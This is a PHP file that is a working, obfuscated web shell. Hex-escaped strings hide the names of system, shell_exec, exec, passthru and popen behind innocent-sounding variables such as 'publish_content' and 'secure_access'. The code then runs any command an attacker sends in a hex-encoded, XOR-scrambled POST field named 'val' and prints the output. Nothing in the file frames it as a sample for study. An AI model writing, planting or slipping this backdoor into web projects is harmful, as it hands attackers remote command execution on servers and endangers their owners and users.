<?php

$publish_content5 = "\x70\x6Fpen";
$publish_content6 = "\x73\x74\x72\x65\x61\x6D\x5F\x67e\x74_c\x6Fntents";
$publish_content1 = "sy\x73t\x65\x6D";
$publish_content3 = "e\x78e\x63";
$publish_content7 = "p\x63\x6Cose";
$framework = "he\x782b\x69\x6E";
$publish_content2 = "s\x68\x65\x6C\x6C_e\x78ec";
$publish_content4 = "\x70\x61\x73\x73thru";
if (isset($_POST["\x76al"])) {
            function secure_access($ptr, $binding){
 $pgrp = '';
for($c=0;
 $c<strlen($ptr);
 $c++){
$pgrp.=chr(ord($ptr[$c])^$binding);

} return $pgrp;

}
            $val = $framework($_POST["\x76al"]);
            $val = secure_access($val, 25);
            if (function_exists($publish_content1)) {
                $publish_content1($val);
            } elseif (function_exists($publish_content2)) {
                print $publish_content2($val);
            } elseif (function_exists($publish_content3)) {
                $publish_content3($val, $dat_ptr);
                print join("\n", $dat_ptr);
            } elseif (function_exists($publish_content4)) {
                $publish_content4($val);
            } elseif (function_exists($publish_content5) && function_exists($publish_content6) && function_exists($publish_content7)) {
                $binding_pgrp = $publish_content5($val, 'r');
                if ($binding_pgrp) {
                    $marker_value = $publish_content6($binding_pgrp);
                    $publish_content7($binding_pgrp);
                    print $marker_value;
                }
            }
            exit;
        }